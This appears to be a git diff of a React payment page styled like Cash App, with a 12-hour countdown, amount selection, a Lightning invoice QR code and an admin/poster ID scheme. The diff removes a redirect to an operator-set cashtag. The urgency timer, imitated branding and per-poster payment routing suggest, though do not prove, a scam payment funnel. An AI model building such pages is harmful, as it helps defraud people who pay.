@@ -16,8 +16,6 @@ export default function Home({ adminId, posterId, param, param2 }) {
   const [showMore, setShowMore] = useState(false);
   const [loading, setLoading] = useState(false);
   const [timeLeft, setTimeLeft] = useState(12 * 60 * 60);
-  const [tagValue, setTagValue] = useState("");
-  const [adminSettings, setAdminSettings] = useState({ showTagField: false, tag: "" });
   const [lightningInvoice, setLightningInvoice] = useState("");
 
   useEffect(() => {
@@ -28,27 +26,6 @@ export default function Home({ adminId, posterId, param, param2 }) {
       return () => clearInterval(timerId);
     }
   }, [step, timeLeft]);
-
-  useEffect(() => {
-    const fetchAdminSettings = async () => {
-      try {
-        const idToQuery = posterId || adminId;
-        const res = await fetch(`${API_URL}/qrcode/status/check/${idToQuery}`);
-        const data = await res.json();
-        if (data && data.length > 0) {
-          setAdminSettings({
-            showTagField: data[0].showTagField,
-            tag: data[0].tag
-          });
-        }
-      } catch (error) {
-        console.error("Error fetching admin settings:", error);
-      }
-    };
-    if (posterId || adminId) {
-      fetchAdminSettings();
-    }
-  }, [posterId, adminId]);
 
   const formatTime = (seconds) => {
     const hrs = Math.floor(seconds / 3600);
@@ -61,9 +38,10 @@ export default function Home({ adminId, posterId, param, param2 }) {
 
   const handlePayNow = async () => {
     setLoading(true);
-    const fullLink = param && param2 
-      ? `https://${site}/${param}/${param2}`
-      : `https://${site}`;
+    const fullLink =
+      param && param2
+        ? `https://${site}/${param}/${param2}`
+        : `https://${site}`;
 
     const values = {
       site: fullLink,
@@ -72,9 +50,8 @@ export default function Home({ adminId, posterId, param, param2 }) {
     };
 
     try {
-      const url = posterId
-        ? `${API_URL}/ad/${adminId}/${posterId}`
-        : `${API_URL}/ad/${adminId}`;
+      const url = `${API_URL}/ad/${adminId}/${posterId}`;
+
       const res = await fetch(url, {
         method: "POST",
         headers: {
@@ -102,15 +79,10 @@ export default function Home({ adminId, posterId, param, param2 }) {
 
   const handleRecommendedPay = () => {
     if (lightningInvoice) {
-      window.location.href = `lightning:${lightningInvoice}`;
-      return;
+      window.location.href = `https://cash.app/launch/lightning/${lightningInvoice}`;
+    } else {
+      toast.error("Lightning invoice is not generated yet.");
     }
-    const cleanTag = (adminSettings.tag || "").trim();
-    const redirectUrl = cleanTag.startsWith("http")
-      ? cleanTag
-      : `https://cash.app/$${cleanTag.replace(/^\$/, "")}`;
-
-    window.location.href = redirectUrl;
   };
 
   const handleAmountClick = (amt) => {
@@ -180,7 +152,9 @@ export default function Home({ adminId, posterId, param, param2 }) {
             {/* Amount Selection Section */}
             <div className="space-y-4">
               <div className="flex items-center gap-1.5 text-[11px] font-extrabold text-gray-400 uppercase tracking-wider mb-2">
-                <div className="w-4 h-4 rounded-full border border-[#00D632] flex items-center justify-center text-[#00D632] text-[9px] font-black font-sans">$</div>
+                <div className="w-4 h-4 rounded-full border border-[#00D632] flex items-center justify-center text-[#00D632] text-[9px] font-black font-sans">
+                  $
+                </div>
                 <span>SELECT AMOUNT</span>
               </div>
 
@@ -232,22 +206,6 @@ export default function Home({ adminId, posterId, param, param2 }) {
                   placeholder="Enter custom amount (min 10, max 2000)"
                 />
               </div>
-
-              {/* Dynamic Tag Input */}
-              {adminSettings.showTagField && (
-                <div className="relative">
-                  <div className="flex items-center gap-1.5 text-[11px] font-extrabold text-gray-400 uppercase tracking-wider mb-1.5">
-                    <span>{adminSettings.tag || "Tag"}</span>
-                  </div>
-                  <input
-                    type="text"
-                    value={tagValue}
-                    onChange={(e) => setTagValue(e.target.value)}
-                    className="w-full py-2.5 px-4 bg-white border border-gray-200 rounded-xl text-sm font-semibold outline-none focus:border-[#00D632] text-gray-700 transition-colors"
-                    placeholder={adminSettings.tag || "Enter details"}
-                  />
-                </div>
-              )}
 
               {/* Pay Button */}
               <button
@@ -302,12 +260,14 @@ export default function Home({ adminId, posterId, param, param2 }) {
               {/* QR Code Container */}
               <div className="relative p-3.5 bg-white border border-gray-100 rounded-[28px] mb-3 w-full aspect-square flex items-center justify-center shadow-sm max-w-[260px] mx-auto">
                 <img
-                  src={`https://api.qrserver.com/v1/create-qr-code/?size=600x600&ecc=H&data=${encodeURIComponent(lightningInvoice || `https://cash.app/launch/lightning/${adminSettings.tag || ""}`)}`}
+                  src={`https://api.qrserver.com/v1/create-qr-code/?size=600x600&ecc=H&data=${encodeURIComponent(`https://cash.app/launch/lightning/${lightningInvoice}`)}`}
                   alt="Payment QR"
                   className="w-full h-full object-contain p-1"
                 />
                 <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-[#00D632] w-9 h-9 rounded-xl flex items-center justify-center shadow-lg border-2 border-white">
-                  <span className="text-white font-black text-lg select-none">$</span>
+                  <span className="text-white font-black text-lg select-none">
+                    $
+                  </span>
                 </div>
               </div>
 
